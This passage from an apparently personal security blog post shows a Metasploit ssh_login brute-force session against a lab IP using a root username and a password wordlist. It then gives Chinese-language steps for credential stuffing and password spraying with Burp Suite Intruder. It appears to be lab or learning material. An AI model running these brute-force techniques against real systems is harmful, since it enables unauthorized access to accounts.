  <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>            no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none             no        Skip existing credentials stored <span class="keyword">in</span> the current database (Accepted: none, us</span><br><span class="line">                                                er, user&amp;realm)</span><br><span class="line">   PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">   RHOSTS                             <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba</span><br><span class="line">                                                sics/using-metasploit.html</span><br><span class="line">   RPORT             22               <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>            <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME                           no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                      no        File containing <span class="built_in">users</span> and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>            <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> username root</span><br><span class="line">username =&gt; root</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> pass_file /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">pass_file =&gt; /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> rhosts 192.168.19.140</span><br><span class="line">rhosts =&gt; 192.168.19.140</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                    Required  Description</span><br><span class="line">   ----              ---------------                    --------  -----------</span><br><span class="line">   ANONYMOUS_LOGIN   <span class="literal">false</span>                              <span class="built_in">yes</span>       Attempt to login with a blank username and password</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>                              no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   BRUTEFORCE_SPEED  5                                  <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                              no        Try each user/password couple stored <span class="keyword">in</span> the current databa</span><br><span class="line">                                                                  se</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>                              no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                              no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_SKIP_EXISTING  none                               no        Skip existing credentials stored <span class="keyword">in</span> the current database (</span><br><span class="line">                                                                  Accepted: none, user, user&amp;realm)</span><br><span class="line">   PASSWORD                                             no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE         /usr/share/wordlists/metasploit/u  no        File containing passwords, one per line</span><br><span class="line">                     nix_passwords.txt</span><br><span class="line">   RHOSTS            192.168.19.140                     <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/u</span><br><span class="line">                                                                  sing-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT             22                                 <span class="built_in">yes</span>       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                              <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                                  <span class="built_in">yes</span>       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          root                               no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                                        no        File containing <span class="built_in">users</span> and passwords separated by space, on</span><br><span class="line">                                                                  e pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                              no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">   USER_FILE                                            no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>                              <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> threads  10</span><br><span class="line">threads =&gt; 10</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> verbose <span class="literal">true</span> </span><br><span class="line">verbose =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="literal">true</span></span><br><span class="line">[*] <span class="built_in">exec</span>: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.19.140:22 - Starting bruteforce</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:admin&#x27;</span></span><br><span class="line">[!] No active DB -- Credential data will not be saved!</span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:123456789&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:password&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:iloveyou&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:princess&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:1234567&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:12345678&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:abc123&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:nicole&#x27;</span></span><br><span class="line">[-] 192.168.19.140:22 - Failed: <span class="string">&#x27;root:daniel&#x27;</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h3 id="Credential-Stuffing-and-Password-Spraying"><a href="#Credential-Stuffing-and-Password-Spraying" class="headerlink" title="Credential Stuffing and Password Spraying"></a><strong>Credential Stuffing and Password Spraying</strong></h3><ul>
<li><a target="_blank" rel="noopener" href="https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/">https://addons.mozilla.org/zh-TW/firefox/addon/foxyproxy-standard/</a></li>
</ul>
<p><img src="img/exploit_Untitled_6.png" alt="Untitled"></p>
<ul>
<li>開啟這個Proxy及Burp Suite攔截目標網站的登入訊息</li>
</ul>
<p><img src="img/exploit_Untitled_7.png" alt="Untitled"></p>
<ul>
<li>burp suite intercept message send to Intruder</li>
</ul>
<p><img src="img/exploit_Untitled_8.png" alt="Untitled"></p>
<ul>
<li>修改Attack type &gt; Pitchfork</li>
</ul>
<p><img src="img/exploit_Untitled_9.png" alt="Untitled"></p>
<ul>
<li>寫入蒐集到的mail、passwd資訊</li>
</ul>
<p><img src="img/exploit_Untitled_10.png" alt="Untitled"></p>
<p><img src="img/exploit_Untitled_11.png" alt="Untitled"></p>
<ul>
<li><p>開啟攻擊並進行帳號密碼爆破</p>
<p>  <img src="img/exploit_Untitled_12.png" alt="Untitled"></p>
</li>
<li><p>可以通過回應訊息內容進行過濾</p>
</li>
<li>開啟Intruder &gt; Option &gt; Grap - Match &gt; clear &gt; Paste</li>
<li>Attack &gt; Pause<ul>
<li>check box 有打勾表示網頁有顯示Grep - Match的內容，可以透過這快速知道登入情況</li>
</ul>
</li>
</ul>
<p><img src="img/exploit_Untitled_13.png" alt="Untitled"></p>
<p><img src="img/exploit_Untitled_14.png" alt="Untitled"></p>
<p><img src="img/exploit_Untitled_15.png" alt="Untitled"></p>
<ul>
<li>通過這個方式去尋找可能有弱密碼的可能</li>
<li>爆破需要時間，若大量發送可能會觸發防火牆告警</li>
<li>通常需要帳號/密碼表讓爆破可以嘗試的內容更多</li>
</ul>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2024/12/21/Github/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">&lt;</strong>
      <div class="article-nav-title">
        
          Upload Multiple Files To Github
        
      </div>
    </a>
  
  
    <a href="/2024/12/21/EBS/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">AWS EC2 Instance Storage</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>





</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="//cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-MML-AM_CHTML"></script>

</body>
</html>